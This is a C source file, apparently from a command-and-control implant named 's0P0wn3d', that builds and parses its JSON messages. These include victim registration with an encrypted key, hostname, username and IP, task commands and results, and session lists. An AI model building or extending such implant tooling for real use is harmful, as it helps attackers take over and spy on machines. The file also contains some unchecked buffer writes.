/*
 * s0P0wn3d — Implémentation des helpers JSON.
 */

#include "json.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Helper : échappe les caractères spéciaux JSON dans une string. */
static char *json_escape(const char *str) {
    if (!str) return strdup("");
    size_t len = strlen(str);
    char *escaped = malloc(len * 6 + 1);  /* pire cas : chaque char → 6 chars */
    if (!escaped) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        switch (str[i]) {
            case '"':  escaped[j++] = '\\'; escaped[j++] = '"'; break;
            case '\\': escaped[j++] = '\\'; escaped[j++] = '\\'; break;
            case '\n': escaped[j++] = '\\'; escaped[j++] = 'n'; break;
            case '\r': escaped[j++] = '\\'; escaped[j++] = 'r'; break;
            case '\t': escaped[j++] = '\\'; escaped[j++] = 't'; break;
            default:
                if ((unsigned char)str[i] < 32) {
                    j += sprintf(escaped + j, "\\u%04x", (unsigned char)str[i]);
                } else {
                    escaped[j++] = str[i];
                }
        }
    }
    escaped[j] = '\0';
    return escaped;
}

/* ─── Construction ────────────────────────────────────────────────────────── */

char *json_build_register(const char *encrypted_key_b64,
                          const host_info_t *host) {
    char *buf = malloc(S0P_MAX_PAYLOAD);
    if (!buf) return NULL;
    snprintf(buf, S0P_MAX_PAYLOAD,
        "{\"encrypted_key\":\"%s\","
        "\"host_info\":{"
        "\"hostname\":\"%s\","
        "\"os\":\"%s\","
        "\"username\":\"%s\","
        "\"arch\":\"%s\","
        "\"ip\":\"%s\","
        "\"implant_version\":\"%s\""
        "}}",
        encrypted_key_b64 ? encrypted_key_b64 : "",
        host ? host->hostname : "",
        host ? host->os : "",
        host ? host->username : "",
        host ? host->arch : "",
        host ? host->ip : "",
        host ? host->implant_version : ""
    );
    return buf;
}

char *json_build_result(const task_result_t *result) {
    char *escaped_output = json_escape(result->output);
    char *buf = malloc(S0P_MAX_PAYLOAD);
    if (!buf) { free(escaped_output); return NULL; }
    snprintf(buf, S0P_MAX_PAYLOAD,
        "{\"type\":\"result\","
        "\"task_id\":\"%s\","
        "\"status\":\"%s\","
        "\"output\":\"%s\""
        "}",
        result->task_id,
        result->status,
        escaped_output
    );
    free(escaped_output);
    return buf;
}

char *json_build_ack(void) {
    return strdup("{\"status\":\"acknowledged\"}");
}

char *json_build_sessions(const session_t *sessions, int count) {
    /* Estimation de taille */
    char *buf = malloc(S0P_MAX_PAYLOAD * (count + 1));
    if (!buf) return NULL;

    int offset = 0;
    offset += sprintf(buf + offset, "{\"sessions\":[");
    for (int i = 0; i < count; i++) {
        if (i > 0) offset += sprintf(buf + offset, ",");
        offset += sprintf(buf + offset,
            "{\"session_id\":\"%s\","
            "\"hostname\":\"%s\","
            "\"os\":\"%s\","
            "\"username\":\"%s\","
            "\"ip\":\"%s\","
            "\"status\":\"%s\"}",
            sessions[i].session_id,
            sessions[i].host_info.hostname,
            sessions[i].host_info.os,
            sessions[i].host_info.username,
            sessions[i].host_info.ip,
            sessions[i].active ? "active" : "dormant"
        );
    }
    offset += sprintf(buf + offset, "],\"total\":%d}", count);
    return buf;
}

/* ─── Parsing ──────────────────────────────────────────────────────────────── */

static char *extract_between_quotes(const char *start) {
    /* start pointe juste après le guillemet ouvrant */
    const char *end = start;
    /* Trouver le guillemet fermant non échappé */
    while (*end) {
        if (*end == '\\' && end[1]) {
            end += 2;
            continue;
        }
        if (*end == '"') break;
        end++;
    }
    if (!*end) return NULL;

    size_t len = end - start;
    char *result = malloc(len + 1);
    if (!result) return NULL;

    /* Copier en décodant les échappements simples */
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (start[i] == '\\' && i + 1 < len) {
            i++;
            switch (start[i]) {
                case 'n': result[j++] = '\n'; break;
                case 'r': result[j++] = '\r'; break;
                case 't': result[j++] = '\t'; break;
                case '"': result[j++] = '"'; break;
                case '\\': result[j++] = '\\'; break;
                default: result[j++] = start[i]; break;
            }
        } else {
            result[j++] = start[i];
        }
    }
    result[j] = '\0';
    return result;
}

char *json_extract_string(const char *json, const char *key) {
    /* Chercher "key": */
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);

    const char *pos = strstr(json, pattern);
    if (!pos) return NULL;

    pos += strlen(pattern);
    /* Skip whitespace and colon */
    while (*pos && (*pos == ' ' || *pos == ':')) pos++;
    if (*pos != '"') return NULL;
    pos++; /* skip opening quote */

    return extract_between_quotes(pos);
}

char *json_extract_nested(const char *json, const char *parent_key,
                         const char *child_key) {
    /* Trouver l'objet parent : "parent_key" suivi de : et { (avec espaces optionnels) */
    char parent_pattern[128];
    snprintf(parent_pattern, sizeof(parent_pattern), "\"%s\"", parent_key);
    const char *parent_pos = strstr(json, parent_pattern);
    if (!parent_pos) return NULL;

    /* Avancer jusqu'au { */
    parent_pos += strlen(parent_pattern);
    while (*parent_pos && *parent_pos != '{') parent_pos++;
    if (*parent_pos != '{') return NULL;
    parent_pos++; /* skip { */

    /* Trouver la clé enfant dans cet objet */
    char child_pattern[128];
    snprintf(child_pattern, sizeof(child_pattern), "\"%s\"", child_key);
    const char *child_pos = strstr(parent_pos, child_pattern);
    if (!child_pos) return NULL;

    child_pos += strlen(child_pattern);
    while (*child_pos && (*child_pos == ' ' || *child_pos == ':')) child_pos++;
    if (*child_pos != '"') return NULL;
    child_pos++;

    return extract_between_quotes(child_pos);
}

int json_parse_task(const char *json, task_t *task) {
    char *task_id = json_extract_string(json, "task_id");
    char *command = json_extract_string(json, "command");
    char *args = json_extract_string(json, "args");

    if (!command) {
        free(task_id);
        free(command);
        free(args);
        return -1;
    }

    memset(task, 0, sizeof(task_t));
    if (task_id) {
        strncpy(task->task_id, task_id, S0P_MAX_TASK_ID - 1);
        free(task_id);
    }
    strncpy(task->command, command, S0P_MAX_COMMAND - 1);
    free(command);
    if (args) {
        strncpy(task->args, args, S0P_MAX_ARGS - 1);
        free(args);
    }
    return 0;
}

int json_parse_result(const char *json, task_result_t *result) {
    char *task_id = json_extract_string(json, "task_id");
    char *status = json_extract_string(json, "status");
    char *output = json_extract_string(json, "output");

    if (!task_id || !status) {
        free(task_id);
        free(status);
        free(output);
        return -1;
    }

    memset(result, 0, sizeof(task_result_t));
    strncpy(result->task_id, task_id, S0P_MAX_TASK_ID - 1);
    strncpy(result->status, status, 15);
    if (output) {
        strncpy(result->output, output, S0P_MAX_OUTPUT - 1);
        free(output);
    }
    free(task_id);
    free(status);
    return 0;
}

int json_parse_tasks(const char *json, task_t *tasks, int max) {
    /* Format attendu : {"type":"tasks","tasks":[{"task_id":"...","command":"...","args":"..."},...]} */
    int count = 0;
    const char *pos = strstr(json, "\"tasks\"");
    if (!pos) return 0;

    pos = strchr(pos, '[');
    if (!pos) return 0;
    pos++; /* skip [ */

    while (count < max) {
        /* Trouver le prochain { */
        const char *obj_start = strchr(pos, '{');
        if (!obj_start) break;

        /* Trouver le } correspondant (simple — pas de nesting dans nos tâches) */
        const char *obj_end = strchr(obj_start, '}');
        if (!obj_end) break;

        size_t obj_len = obj_end - obj_start + 1;
        char *obj_str = malloc(obj_len + 1);
        if (!obj_str) break;
        memcpy(obj_str, obj_start, obj_len);
        obj_str[obj_len] = '\0';

        if (json_parse_task(obj_str, &tasks[count]) == 0) {
            count++;
        }
        free(obj_str);

        pos = obj_end + 1;
        /* Chercher une virgule ou la fin du tableau */
        while (*pos && (*pos == ' ' || *pos == ',')) pos++;
        if (*pos == ']') break;
    }
    return count;
}
